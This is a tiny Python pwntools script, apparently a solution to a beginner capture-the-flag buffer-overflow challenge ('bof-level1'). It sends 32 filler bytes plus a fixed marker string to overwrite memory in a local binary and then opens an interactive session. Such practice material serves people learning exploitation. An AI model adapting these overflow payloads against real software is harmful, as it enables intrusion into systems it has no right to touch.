#!/usr/bin/env python

from pwn import *

p = process("./bof-level1")

print(p.recv())

p.sendline("A" * 32 + "ABCDEFGHabcdefgh")

p.interactive()
